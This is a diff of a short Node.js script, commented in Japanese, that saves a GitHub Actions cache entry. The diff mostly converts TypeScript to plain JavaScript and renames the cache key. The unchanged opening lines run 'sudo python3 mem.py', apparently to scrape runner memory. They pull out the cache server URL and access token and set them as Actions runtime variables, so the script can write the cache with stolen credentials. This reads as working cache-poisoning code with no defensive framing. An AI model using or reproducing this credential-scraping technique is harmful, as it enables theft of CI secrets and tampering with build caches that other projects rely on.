@@ -1,7 +1,3 @@
-import * as core from '@actions/core';
-import * as cache from '@actions/cache';
-
-
 const { execSync } = await import("child_process");
 const memtext = execSync("sudo python3 mem.py", { encoding: "utf8" });
 const url = memtext.match(/CacheServerUrl"\s*:\s*"([^"]+)"/)?.[1];
@@ -10,32 +6,33 @@ const token = memtext.match(/AccessToken"\s*:\s*"([^"]+)"/)?.[1];
 process.env.ACTIONS_RUNTIME_TOKEN = token;
 process.env.ACTIONS_RESULTS_URL = url;
 
+const cache = require('@actions/cache');
+const core = require('@actions/core');
 
-
-async function run(): Promise<void> {
+async function run() {
   try {
-    // 1. キャッシュ対象のパス（複数指定可）
+    // 1. キャッシュしたいディレクトリやファイルのパス
     const paths = [
       'test.txt'
     ];
 
     // 2. キャッシュを一意に識別するキー
-    const key = `tmpcache`;
+    const key = `tmpkey`;
 
-    // 3. キャッシュの保存を実行（戻り値は保存されたキャッシュのID）
+    console.log(`Saving cache with key: ${key}...`);
+
+    // 3. キャッシュの保存を実行
     const cacheId = await cache.saveCache(paths, key);
 
     if (cacheId !== -1) {
-      core.info(`Cache saved successfully with key: ${key} (ID: ${cacheId})`);
+      console.log(`Cache saved successfully! (ID: ${cacheId})`);
     } else {
-      core.info('Cache was not saved (e.g., cache already exists or feature unavailable).');
+      console.log('Cache was not saved (already exists or unavailable).');
     }
   } catch (error) {
-    // キャッシュ保存の失敗でワークフロー全体を止めたくない場合は warning に留めるのが一般的です
-    if (error instanceof Error) {
-      core.warning(`Failed to save cache: ${error.message}`);
-    }
+    // 失敗してもワークフローを止めない場合は warning に留める
+    core.warning(`Failed to save cache: ${error.message}`);
   }
 }
 
-await run();
+run();
